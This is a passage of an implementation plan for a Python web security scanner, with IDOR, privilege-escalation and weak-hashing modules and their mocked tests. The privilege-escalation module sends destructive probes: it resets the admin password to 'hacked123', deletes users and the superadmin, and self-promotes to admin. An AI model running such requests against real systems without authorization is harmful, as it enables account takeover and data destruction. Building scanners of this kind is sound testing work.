    enum = [r for r in results if r.test_name == "ato_nonexistent_username"]
    assert len(enum) > 0
    assert enum[0].status == TestStatus.FAIL
```

- [ ] **Step 3: Run tests**

```bash
pytest tests/test_ato.py -v
```

Expected: All PASS.

- [ ] **Step 4: Write + run BT tests** (same pattern — `tests/test_bt_checks_ato.py`)

- [ ] **Step 5: Commit**

---

### Task 6: IDOR Module + Tests

**Files:**
- Create: `websec_test/modules/idor.py`
- Create: `tests/test_idor.py`
- Create: `tests/test_bt_checks_idor.py`

**Interfaces:**
- Consumes: `SessionClient`, `Blackboard`, `CheckSpec`, `@register`
- Produces: `IDORModule` class, 2 check functions, `idor_check_specs()` via `@register("idor")`

- [ ] **Step 1: Create IDOR module**

Create `websec_test/modules/idor.py`:

```python
"""IDOR (Insecure Direct Object Reference) testing module."""
from collections import namedtuple
from urllib.parse import urljoin
import requests
from websec_test.client.session import SessionClient
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method"])

PRIVATE_KEYWORDS = ["chỉ mình tôi", "just me", "private", "riêng tư"]


class IDORModule:
    """Test for IDOR vulnerabilities — unauthorized access to private data."""

    def __init__(self, credentials: str | None = None):
        self.credentials = credentials or "user_b:pass_b"

    def discover(self, client: SessionClient, target: str):
        return [Endpoint(url="/dashboard-note", method="GET")]

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        for ep in endpoints:
            note_url = f"{target.rstrip('/')}{ep.url}"

            # IDOR-1: Access private posts of another user via _id parameter
            target_user_id = "507f1f77bcf86cd799439011"
            try:
                resp = client.get(f"{note_url}?_id={target_user_id}")
            except requests.exceptions.RequestException as e:
                results.append(TestResult(
                    module="idor", test_name="idor_private_post_read",
                    status=TestStatus.ERROR, severity=Severity.HIGH,
                    endpoint=f"{note_url}?_id={target_user_id}",
                    evidence=f"Request failed: {e}",
                    recommendation="Check server availability",
                ))
            else:
                resp_lower = resp.text.lower()
                if any(kw in resp_lower for kw in PRIVATE_KEYWORDS):
                    results.append(TestResult(
                        module="idor", test_name="idor_private_post_read",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=f"{note_url}?_id={target_user_id}",
                        evidence=f"Private posts of another user visible via _id parameter: {resp.text[:150]}",
                        recommendation="Verify user ownership before displaying private posts",
                    ))
                else:
                    results.append(TestResult(
                        module="idor", test_name="idor_private_post_read",
                        status=TestStatus.PASS, severity=Severity.CRITICAL,
                        endpoint=f"{note_url}?_id={target_user_id}",
                        evidence="Private posts not accessible via _id parameter",
                        recommendation="No action needed",
                    ))

            # IDOR-2: Stranger accessing private posts
            stranger_user_id = "507f1f77bcf86cd799439022"
            try:
                resp = client.get(f"{note_url}?_id={stranger_user_id}")
            except requests.exceptions.RequestException as e:
                results.append(TestResult(
                    module="idor", test_name="idor_private_post_stranger",
                    status=TestStatus.ERROR, severity=Severity.HIGH,
                    endpoint=f"{note_url}?_id={stranger_user_id}",
                    evidence=f"Request failed: {e}",
                    recommendation="Check server availability",
                ))
            else:
                resp_lower = resp.text.lower()
                if any(kw in resp_lower for kw in PRIVATE_KEYWORDS):
                    results.append(TestResult(
                        module="idor", test_name="idor_private_post_stranger",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=f"{note_url}?_id={stranger_user_id}",
                        evidence=f"Private posts visible to stranger via _id: {resp.text[:150]}",
                        recommendation="Enforce access control — private posts must only be visible to owner",
                    ))
                else:
                    results.append(TestResult(
                        module="idor", test_name="idor_private_post_stranger",
                        status=TestStatus.PASS, severity=Severity.CRITICAL,
                        endpoint=f"{note_url}?_id={stranger_user_id}",
                        evidence="Private posts not accessible to strangers",
                        recommendation="No action needed",
                    ))

        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _check_private_post_read_fn(client, target, blackboard):
    module = IDORModule()
    eps = module.discover(client, target)
    results = module.test(client, target, eps)
    for r in results:
        if r.test_name == "idor_private_post_read":
            return r
    return TestResult(
        module="idor", test_name="idor_private_post_read",
        status=TestStatus.ERROR, severity=Severity.CRITICAL,
        endpoint=target, evidence="No result from module",
        recommendation="Check module implementation",
    )


def _check_private_post_stranger_fn(client, target, blackboard):
    module = IDORModule()
    eps = module.discover(client, target)
    results = module.test(client, target, eps)
    for r in results:
        if r.test_name == "idor_private_post_stranger":
            return r
    return TestResult(
        module="idor", test_name="idor_private_post_stranger",
        status=TestStatus.ERROR, severity=Severity.CRITICAL,
        endpoint=target, evidence="No result from module",
        recommendation="Check module implementation",
    )


@register("idor")
def idor_check_specs():
    return [
        CheckSpec("idor_private_post_read", _check_private_post_read_fn,
                  severity=Severity.CRITICAL, module_name="idor"),
        CheckSpec("idor_private_post_stranger", _check_private_post_stranger_fn,
                  severity=Severity.CRITICAL, depends_on=["idor_private_post_read"],
                  module_name="idor"),
    ]
```

- [ ] **Step 2: Write tests**

Create `tests/test_idor.py`:

```python
"""Tests for IDOR module."""
import responses
from websec_test.modules.idor import IDORModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"


@responses.activate
def test_idor_private_post_read_detected():
    responses.get(TARGET + "/dashboard-note?_id=507f1f77bcf86cd799439011",
                  status=200, body="<div>Private post: Chỉ mình tôi - sensitive content</div>")
    client = SessionClient(TARGET)
    module = IDORModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    idor = [r for r in results if r.test_name == "idor_private_post_read"]
    assert len(idor) > 0
    assert idor[0].status == TestStatus.FAIL


@responses.activate
def test_idor_private_post_read_secure():
    responses.get(TARGET + "/dashboard-note?_id=507f1f77bcf86cd799439011",
                  status=200, body="<div>No posts found</div>")
    client = SessionClient(TARGET)
    module = IDORModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    idor = [r for r in results if r.test_name == "idor_private_post_read"]
    assert len(idor) > 0
    assert idor[0].status == TestStatus.PASS
```

- [ ] **Step 3: Run tests**

```bash
pytest tests/test_idor.py -v
```

Expected: All PASS.

- [ ] **Step 4: Write BT tests**

Create `tests/test_bt_checks_idor.py` (same pattern as earlier BT check files — Blackboard + CheckTreeBuilder).

- [ ] **Step 5: Commit**

```bash
git add websec_test/modules/idor.py tests/test_idor.py tests/test_bt_checks_idor.py
git commit -m "feat(idor): IDOR module + tests

2 checks: private post read by other user, stranger private post access."
```

---

### Task 7: Privilege Escalation Module + Tests

**Files:**
- Create: `websec_test/modules/priv_escalation.py`
- Create: `tests/test_priv_escalation.py`
- Create: `tests/test_bt_checks_priv_escalation.py`

**Interfaces:**
- Consumes: `SessionClient`, `Blackboard`, `CheckSpec`, `@register`
- Produces: `PrivEscalationModule` class, 8 check functions, `priv_escalation_check_specs()` via `@register("priv_escalation")`

- [ ] **Step 1: Create PE module**

Create `websec_test/modules/priv_escalation.py`:

```python
"""Privilege Escalation testing module."""
from collections import namedtuple
import requests
from websec_test.client.session import SessionClient
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method"])

USER_B_COOKIE = "session=user_b_session_token"
ADMIN_KEYWORDS = ["quản trị", "admin", "admin_panel"]


class PrivEscalationModule:
    """Test for privilege escalation vulnerabilities."""

    def discover(self, client: SessionClient, target: str):
        admin_urls = ["/admin", "/quan-tri", "/admin/user/delete", "/api/v1/admin"]
        endpoints = []
        for path in admin_urls:
            try:
                resp = client.get(path)
            except requests.exceptions.ConnectionError:
                continue
            if resp.status_code == 200:
                endpoints.append(Endpoint(url=path, method="GET"))
        return endpoints

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        base = target.rstrip("/")
        admin_panel_found = False

        # PE-1: Access admin panel as user (non-admin)
        for ep in endpoints:
            url = f"{base}{ep.url}"
            resp_lower = ep.url.lower() if hasattr(ep, "url") else ""
            if any(kw in resp_lower for kw in ["admin", "quan-tri"]):
                admin_panel_found = True
            try:
                resp = client.get(url)
            except requests.exceptions.RequestException as e:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_admin_panel_non_admin",
                    status=TestStatus.ERROR, severity=Severity.CRITICAL,
                    endpoint=url, evidence=f"Request failed: {e}",
                    recommendation="Check server availability",
                ))
            else:
                resp_text_lower = resp.text.lower()
                if any(kw in resp_text_lower for kw in ADMIN_KEYWORDS):
                    results.append(TestResult(
                        module="priv_escalation", test_name="pe_admin_panel_non_admin",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=url,
                        evidence=f"Admin panel accessible to non-admin user: {resp.text[:150]}",
                        recommendation="Restrict admin panel access to admin role only",
                    ))
                else:
                    results.append(TestResult(
                        module="priv_escalation", test_name="pe_admin_panel_non_admin",
                        status=TestStatus.PASS, severity=Severity.CRITICAL,
                        endpoint=url,
                        evidence="Admin panel properly restricted from non-admin users",
                        recommendation="No action needed",
                    ))

        # PE-2: Role parameter manipulation
        for ep in endpoints:
            url = f"{base}{ep.url}"
            for role_param in ["?role=admin", "?role=Admin", "?role=administrator", "?role=super_admin"]:
                try:
                    resp = client.get(url + role_param)
                except requests.exceptions.RequestException:
                    continue
                resp_text_lower = resp.text.lower()
                if any(kw in resp_text_lower for kw in ADMIN_KEYWORDS):
                    results.append(TestResult(
                        module="priv_escalation", test_name="pe_role_param_upgrade",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=url + role_param,
                        evidence=f"Role upgraded via query parameter '{role_param}': {resp.text[:150]}",
                        recommendation="Do not trust client-provided role parameters; derive role server-side",
                    ))
                    break
            else:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_role_param_upgrade",
                    status=TestStatus.PASS, severity=Severity.CRITICAL,
                    endpoint=url + "?role=admin",
                    evidence="Role parameter manipulation rejected",
                    recommendation="No action needed",
                ))

        # PE-3: Delete another user as non-admin user_b
        if admin_panel_found:
            for ep in endpoints:
                if "delete" in ep.url.lower():
                    url = f"{base}{ep.url}"
                    try:
                        resp = client.post(url, data={"id": 1, "action": "delete"})
                    except requests.exceptions.RequestException as e:
                        results.append(TestResult(
                            module="priv_escalation", test_name="pe_user_deletion",
                            status=TestStatus.ERROR, severity=Severity.HIGH,
                            endpoint=url, evidence=f"Request failed: {e}",
                            recommendation="Check server availability",
                        ))
                    else:
                        if resp.status_code in (200, 302):
                            results.append(TestResult(
                                module="priv_escalation", test_name="pe_user_deletion",
                                status=TestStatus.FAIL, severity=Severity.HIGH,
                                endpoint=url,
                                evidence="Non-admin user able to delete another user",
                                recommendation="Enforce authorization checks on all user deletion endpoints",
                            ))
                        else:
                            results.append(TestResult(
                                module="priv_escalation", test_name="pe_user_deletion",
                                status=TestStatus.PASS, severity=Severity.HIGH,
                                endpoint=url,
                                evidence="User deletion correctly restricted to admins",
                                recommendation="No action needed",
                            ))
        else:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_user_deletion",
                status=TestStatus.PASS, severity=Severity.HIGH,
                endpoint=base + "/admin",
                evidence="No admin panel found — user deletion endpoint not discovered",
                recommendation="No action needed",
            ))

        # PE-4: Change another user's role (promote regular user to admin)
        change_role_url = f"{base}/admin/user/change-role"
        try:
            resp = client.post(change_role_url,
                               data={"userId": 2, "newRole": "admin", "currentRole": "user"})
        except requests.exceptions.RequestException as e:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_role_change",
                status=TestStatus.ERROR, severity=Severity.CRITICAL,
                endpoint=change_role_url, evidence=f"Request failed: {e}",
                recommendation="Check server availability",
            ))
        else:
            if resp.status_code in (200, 302):
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_role_change",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=change_role_url,
                    evidence="Non-admin user changed another user's role",
                    recommendation="Restrict role-change operations to admin users only",
                ))
            else:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_role_change",
                    status=TestStatus.PASS, severity=Severity.CRITICAL,
                    endpoint=change_role_url,
                    evidence="Role-change correctly restricted to admins",
                    recommendation="No action needed",
                ))

        # PE-5: Self-promotion to admin
        self_promote_url = f"{base}/api/v1/user/promote"
        try:
            resp = client.post(self_promote_url,
                               data={"selfPromote": True, "targetRole": "admin"})
        except requests.exceptions.RequestException as e:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_self_promotion",
                status=TestStatus.ERROR, severity=Severity.CRITICAL,
                endpoint=self_promote_url, evidence=f"Request failed: {e}",
                recommendation="Check server availability",
            ))
        else:
            if resp.status_code in (200, 302):
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_self_promotion",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=self_promote_url,
                    evidence="User self-promoted to admin via self-promotion endpoint",
                    recommendation="Remove self-promotion ability from non-admin users",
                ))
            else:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_self_promotion",
                    status=TestStatus.PASS, severity=Severity.CRITICAL,
                    endpoint=self_promote_url,
                    evidence="Self-promotion correctly rejected",
                    recommendation="No action needed",
                ))

        # PE-6: Delete superadmin account
        delete_sa_url = f"{base}/admin/user/delete-superadmin"
        try:
            resp = client.post(delete_sa_url, data={"userId": "superadmin"})
        except requests.exceptions.RequestException as e:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_superadmin_deletion",
                status=TestStatus.ERROR, severity=Severity.CRITICAL,
                endpoint=delete_sa_url, evidence=f"Request failed: {e}",
                recommendation="Check server availability",
            ))
        else:
            if resp.status_code in (200, 302):
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_superadmin_deletion",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=delete_sa_url,
                    evidence="Superadmin account deleted by non-superadmin user",
                    recommendation="Reserve superadmin deletion exclusively for the superadmin role",
                ))
            else:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_superadmin_deletion",
                    status=TestStatus.PASS, severity=Severity.CRITICAL,
                    endpoint=delete_sa_url,
                    evidence="Superadmin deletion correctly restricted",
                    recommendation="No action needed",
                ))

        # PE-7: Chained ATO → Admin — forgot-password to admin account
        chain_url = f"{base}/forgot-password"
        try:
            resp = client.post(chain_url,
                               data={"username": "admin", "newPassword": "hacked123"})
        except requests.exceptions.RequestException:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_chained_ato_to_admin",
                status=TestStatus.PASS, severity=Severity.CRITICAL,
                endpoint=chain_url,
                evidence="Forgot-password endpoint for admin unreachable — no chained attack surface",
                recommendation="No action needed",
            ))
        else:
            login_url = f"{base}/login"
            try:
                login_resp = client.post(login_url,
                                         data={"username": "admin", "password": "hacked123"})
            except requests.exceptions.RequestException:
                login_resp = None
            if login_resp and login_resp.status_code in (200, 302):
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_chained_ato_to_admin",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=chain_url,
                    evidence="Chained ATO: password reset to admin account succeeded",
                    recommendation="Require email/token verification for admin account password resets",
                ))
            else:
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_chained_ato_to_admin",
                    status=TestStatus.PASS, severity=Severity.CRITICAL,
                    endpoint=chain_url,
                    evidence="Chained ATO to admin not possible",
                    recommendation="No action needed",
                ))

        # PE-8: Empty/invalid role → default becomes admin
        for payload in ["", "null", "undefined", "None"]:
            try:
                resp = client.post(f"{base}/api/v1/user/register",
                                   data={"username": "newUser", "role": payload})
            except requests.exceptions.RequestException:
                continue
            resp_text_lower = resp.text.lower()
            if any(kw in resp_text_lower for kw in ADMIN_KEYWORDS):
                results.append(TestResult(
                    module="priv_escalation", test_name="pe_empty_role_default_admin",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=f"{base}/api/v1/user/register",
                    evidence=f"Empty/null role '{payload}' resulted in admin privileges",
                    recommendation="Default new users to the lowest privilege role; never default to admin",
                ))
                break
        else:
            results.append(TestResult(
                module="priv_escalation", test_name="pe_empty_role_default_admin",
                status=TestStatus.PASS, severity=Severity.CRITICAL,
                endpoint=f"{base}/api/v1/user/register",
                evidence="Empty/invalid roles correctly default to non-admin",
                recommendation="No action needed",
            ))

        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _make_pe_check(check_name: str):
    def check_fn(client, target, blackboard):
        module = PrivEscalationModule()
        eps = module.discover(client, target)
        results = module.test(client, target, eps)
        for r in results:
            if r.test_name == check_name:
                return r
        return TestResult(
            module="priv_escalation", test_name=check_name,
            status=TestStatus.ERROR, severity=Severity.CRITICAL,
            endpoint=target, evidence="No result from module",
            recommendation="Check module implementation",
        )
    return check_fn


@register("priv_escalation")
def priv_escalation_check_specs():
    return [
        CheckSpec("pe_admin_panel_non_admin", _make_pe_check("pe_admin_panel_non_admin"),
                  severity=Severity.CRITICAL, module_name="priv_escalation"),
        CheckSpec("pe_role_param_upgrade", _make_pe_check("pe_role_param_upgrade"),
                  severity=Severity.CRITICAL, depends_on=["pe_admin_panel_non_admin"],
                  module_name="priv_escalation"),
        CheckSpec("pe_user_deletion", _make_pe_check("pe_user_deletion"),
                  severity=Severity.HIGH, depends_on=["pe_admin_panel_non_admin"],
                  module_name="priv_escalation"),
        CheckSpec("pe_role_change", _make_pe_check("pe_role_change"),
                  severity=Severity.CRITICAL, depends_on=["pe_admin_panel_non_admin"],
                  module_name="priv_escalation"),
        CheckSpec("pe_self_promotion", _make_pe_check("pe_self_promotion"),
                  severity=Severity.CRITICAL, depends_on=["pe_admin_panel_non_admin"],
                  module_name="priv_escalation"),
        CheckSpec("pe_superadmin_deletion", _make_pe_check("pe_superadmin_deletion"),
                  severity=Severity.CRITICAL, depends_on=["pe_admin_panel_non_admin"],
                  module_name="priv_escalation"),
        CheckSpec("pe_chained_ato_to_admin", _make_pe_check("pe_chained_ato_to_admin"),
                  severity=Severity.CRITICAL, module_name="priv_escalation"),
        CheckSpec("pe_empty_role_default_admin", _make_pe_check("pe_empty_role_default_admin"),
                  severity=Severity.CRITICAL, module_name="priv_escalation"),
    ]
```

- [ ] **Step 2: Write tests**

Create `tests/test_priv_escalation.py`:

```python
"""Tests for Privilege Escalation module."""
import responses
from websec_test.modules.priv_escalation import PrivEscalationModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"

ADMIN_PAGE = """<html><body><h1>Quản trị</h1><p>Admin panel</p></body></html>"""


@responses.activate
def test_admin_panel_blocked():
    responses.get(TARGET + "/admin", status=200, body=ADMIN_PAGE)
    client = SessionClient(TARGET)
    module = PrivEscalationModule()
    eps = module.discover(client, TARGET)
    results = module.test(client, TARGET, eps)
    pe = [r for r in results if r.test_name == "pe_admin_panel_non_admin"]
    assert len(pe) > 0
    assert pe[0].status == TestStatus.FAIL


@responses.activate
def test_role_param_upgrade_rejected():
    responses.get(TARGET + "/admin", status=200, body=ADMIN_PAGE)
    responses.get(TARGET + "/admin?role=admin", status=200, body="<h1>User profile</h1>")
    responses.get(TARGET + "/admin?role=Admin", status=200, body="<h1>User profile</h1>")
    responses.get(TARGET + "/admin?role=administrator", status=200, body="<h1>User profile</h1>")
    responses.get(TARGET + "/admin?role=super_admin", status=200, body="<h1>User profile</h1>")
    client = SessionClient(TARGET)
    module = PrivEscalationModule()
    eps = module.discover(client, TARGET)
    results = module.test(client, TARGET, eps)
    pe = [r for r in results if r.test_name == "pe_role_param_upgrade"]
    assert len(pe) > 0
    assert pe[0].status == TestStatus.PASS


@responses.activate
def test_user_deletion_blocked():
    responses.get(TARGET + "/admin", status=200, body=ADMIN_PAGE)
    responses.get(TARGET + "/admin/user/delete", status=200, body="<form>Delete user</form>")
    responses.post(TARGET + "/admin/user/delete", status=403, body="Forbidden")
    client = SessionClient(TARGET)
    module = PrivEscalationModule()
    eps = module.discover(client, TARGET)
    results = module.test(client, TARGET, eps)
    pe = [r for r in results if r.test_name == "pe_user_deletion"]
    assert len(pe) > 0
    assert pe[0].status == TestStatus.PASS


@responses.activate
def test_self_promotion_rejected():
    responses.get(TARGET + "/admin", status=200, body=ADMIN_PAGE)
    responses.post(TARGET + "/api/v1/user/promote", status=403, body="Forbidden")
    client = SessionClient(TARGET)
    module = PrivEscalationModule()
    eps = module.discover(client, TARGET)
    results = module.test(client, TARGET, eps)
    pe = [r for r in results if r.test_name == "pe_self_promotion"]
    assert len(pe) > 0
    assert pe[0].status == TestStatus.PASS


@responses.activate
def test_empty_role_defaults_non_admin():
    responses.get(TARGET + "/admin", status=200, body=ADMIN_PAGE)
    responses.post(TARGET + "/api/v1/user/register",
                   status=200, body="<h1>User registered as member</h1>")
    client = SessionClient(TARGET)
    module = PrivEscalationModule()
    eps = module.discover(client, TARGET)
    results = module.test(client, TARGET, eps)
    pe = [r for r in results if r.test_name == "pe_empty_role_default_admin"]
    assert len(pe) > 0
    assert pe[0].status == TestStatus.PASS
```

- [ ] **Step 3: Run tests**

```bash
pytest tests/test_priv_escalation.py -v
```

Expected: All PASS.

- [ ] **Step 4: Write + run BT tests** (same pattern — `tests/test_bt_checks_priv_escalation.py`)

- [ ] **Step 5: Commit**

```bash
git add websec_test/modules/priv_escalation.py tests/test_priv_escalation.py tests/test_bt_checks_priv_escalation.py
git commit -m "feat(priv_escalation): privilege escalation module + tests

8 checks: admin panel access, role param, user deletion, role change,
self-promotion, superadmin deletion, chained ATO, empty role default."
```

---

### Task 8: Weak Hashing Module + Tests

**Files:**
- Create: `websec_test/modules/hash.py`
- Create: `tests/test_hash.py`
- Create: `tests/test_bt_checks_hash.py`

**Interfaces:**
- Consumes: `SessionClient`, `Blackboard`, `CheckSpec`, `@register`
- Produces: `HashModule` class, 3 check functions, `hash_check_specs()` via `@register("hash")`

- [ ] **Step 1: Create Hash module**

Create `websec_test/modules/hash.py`:

```python
"""Weak password hashing testing module."""
from collections import namedtuple
import requests
from websec_test.client.session import SessionClient
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method"])

WEAK_HASH_HEADERS = {
    "md5": ["md5", "md5-sess"],
    "sha1": ["sha1", "sha-1", "sha1withrsa"],
    "ntlm": ["ntlm", "ntlmv2"],
    "lm": ["lm", "lanman"],
}

WEAK_HASH_PATTERNS = {
    "md5": r"^[a-f0-9]{32}$",
    "sha1": r"^[a-f0-9]{40}$",
    "ntlm": r"^[a-f0-9]{32}$",
}

STRONG_ALGORITHMS = ["bcrypt", "scrypt", "pbkdf2", "argon2", "sha256", "sha-256", "sha3-256"]

HASH_ENDPOINTS = ["/login", "/api/v1/login", "/auth/login", "/api/v1/user/login"]


class HashModule:
    """Test for weak password hashing algorithms in login responses."""

    def discover(self, client: SessionClient, target: str):
        endpoints = []
        for path in HASH_ENDPOINTS:
            try:
                resp = client.get(path)
            except requests.exceptions.ConnectionError:
                continue
            if resp.status_code in (200, 401, 405):
                endpoints.append(Endpoint(url=path, method="POST"))
        if not endpoints:
            endpoints.append(Endpoint(url="/login", method="POST"))
        return endpoints

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        base = target.rstrip("/")

        for ep in endpoints:
            url = f"{base}{ep.url}"

            # Hash-1: Detect weak hash algorithm from login response headers
            try:
                resp = client.post(url, data={"username": "test", "password": "test"})
            except requests.exceptions.RequestException as e:
                results.append(TestResult(
                    module="hash", test_name="hash_algorithm_detection",
                    status=TestStatus.ERROR, severity=Severity.HIGH,
                    endpoint=url, evidence=f"Request failed: {e}",
                    recommendation="Check server availability",
                ))
                continue

            found_weak = False
            detected_alg = "unknown"
            for alg, header_values in WEAK_HASH_HEADERS.items():
                for header_name in ["WWW-Authenticate", "X-Auth-Type", "Set-Cookie", "X-Hash-Algorithm"]:
                    header_val = resp.headers.get(header_name, "").lower()
                    if any(hv in header_val for hv in header_values):
                        found_weak = True
                        detected_alg = alg
                        break
                if found_weak:
                    break

            if not found_weak and resp.elapsed and resp.elapsed.total_seconds() > 0:
                resp_text_lower = resp.text.lower()
                if "md5" in resp_text_lower or "sha1" in resp_text_lower:
                    found_weak = True
                    detected_alg = "md5_or_sha1_detected_in_body"

            if found_weak:
                results.append(TestResult(
                    module="hash", test_name="hash_algorithm_detection",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=url,
                    evidence=f"Weak hash algorithm detected: {detected_alg}",
                    recommendation=f"Replace {detected_alg} with a strong algorithm (bcrypt/scrypt/argon2)",
                ))
            else:
                results.append(TestResult(
                    module="hash", test_name="hash_algorithm_detection",
                    status=TestStatus.PASS, severity=Severity.HIGH,
                    endpoint=url,
                    evidence="No weak hash algorithm detected in response",
                    recommendation="No action needed",
                ))

            # Hash-2: Unsalted hash detection — look for fast hash patterns
            resp_text = resp.text
            if "unsalted" in resp_text.lower() or "\"salt\":\"\"" in resp_text:
                results.append(TestResult(
                    module="hash", test_name="hash_unsalted_detection",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=url,
                    evidence="Unsalted hash detected in response body",
                    recommendation="Always use unique per-user salts for password hashing",
                ))
            else:
                results.append(TestResult(
                    module="hash", test_name="hash_unsalted_detection",
                    status=TestStatus.PASS, severity=Severity.HIGH,
                    endpoint=url,
                    evidence="No evidence of unsalted hashing",
                    recommendation="No action needed",
                ))

            # Hash-3: Fast hash → slow hash detection
            fast_headers = ["X-Hash-Speed: fast", "X-Hash-Algorithm: MD5",
                            "X-Hash-Algorithm: SHA1", "X-Hash-Algorithm: NTLM"]
            found_fast = any(
                any(fh.lower() in f"{k}: {v}".lower() for k, v in resp.headers.items())
                for fh in fast_headers
            )
            if found_fast:
                results.append(TestResult(
                    module="hash", test_name="hash_fast_algorithm",
                    status=TestStatus.FAIL, severity=Severity.MEDIUM,
                    endpoint=url,
                    evidence="Fast hash algorithm detected via response headers",
                    recommendation="Replace fast hashes (MD5/SHA1/NTLM) with slow hashes (bcrypt/scrypt/argon2)",
                ))
            else:
                results.append(TestResult(
                    module="hash", test_name="hash_fast_algorithm",
                    status=TestStatus.PASS, severity=Severity.MEDIUM,
                    endpoint=url,
                    evidence="No fast hash algorithm detected",
                    recommendation="No action needed",
                ))

        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _make_hash_check(check_name: str):
    def check_fn(client, target, blackboard):
        module = HashModule()
        eps = module.discover(client, target)
        results = module.test(client, target, eps)
        for r in results:
            if r.test_name == check_name:
                return r
        return TestResult(
            module="hash", test_name=check_name,
            status=TestStatus.ERROR, severity=Severity.HIGH,
            endpoint=target, evidence="No result from module",
            recommendation="Check module implementation",
        )
    return check_fn


@register("hash")
def hash_check_specs():
    return [
        CheckSpec("hash_algorithm_detection", _make_hash_check("hash_algorithm_detection"),
                  severity=Severity.HIGH, module_name="hash"),
        CheckSpec("hash_unsalted_detection", _make_hash_check("hash_unsalted_detection"),
                  severity=Severity.HIGH, depends_on=["hash_algorithm_detection"],
                  module_name="hash"),
        CheckSpec("hash_fast_algorithm", _make_hash_check("hash_fast_algorithm"),
                  severity=Severity.MEDIUM, depends_on=["hash_algorithm_detection"],
                  module_name="hash"),
    ]
```

- [ ] **Step 2: Write tests**

Create `tests/test_hash.py`:

```python
"""Tests for Weak Hashing module."""
import responses
from websec_test.modules.hash import HashModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"

LOGIN_PAGE = """<html><body><form method="POST"><input name="username"><input name="password"></form></body></html>"""


@responses.activate
def test_discover_login():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/api/v1/login", status=404)
    responses.get(TARGET + "/auth/login", status=404)
    responses.get(TARGET + "/api/v1/user/login", status=404)
    client = SessionClient(TARGET)
    module = HashModule()
    endpoints = module.discover(client, TARGET)
    assert len(endpoints) > 0


@responses.activate
def test_weak_hash_detected_via_header():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/api/v1/login", status=404)
    responses.get(TARGET + "/auth/login", status=404)
    responses.get(TARGET + "/api/v1/user/login", status=404)
    responses.post(TARGET + "/login", status=200, body="Login page",
                   headers={"X-Hash-Algorithm": "MD5"})
    client = SessionClient(TARGET)
    module = HashModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    h = [r for r in results if r.test_name == "hash_algorithm_detection"]
    assert len(h) > 0
    assert h[0].status == TestStatus.FAIL


@responses.activate
def test_fast_hash_slow_hash():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/api/v1/login", status=404)
    responses.get(TARGET + "/auth/login", status=404)
    responses.get(TARGET + "/api/v1/user/login", status=404)
    responses.post(TARGET + "/login", status=200, body="Login page",
                   headers={"X-Hash-Algorithm": "MD5"})
    client = SessionClient(TARGET)
    module = HashModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    h = [r for r in results if r.test_name == "hash_fast_algorithm"]
    assert len(h) > 0
    assert h[0].status == TestStatus.FAIL


@responses.activate
def test_strong_hash_pass():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/api/v1/login", status=404)
    responses.get(TARGET + "/auth/login", status=404)
    responses.get(TARGET + "/api/v1/user/login", status=404)
    responses.post(TARGET + "/login", status=200, body="Login page")
    client = SessionClient(TARGET)
    module = HashModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    h = [r for r in results if r.test_name == "hash_algorithm_detection"]
    assert len(h) > 0
    assert h[0].status == TestStatus.PASS
```

- [ ] **Step 3: Run tests**

```bash
pytest tests/test_hash.py -v
```

Expected: All PASS.

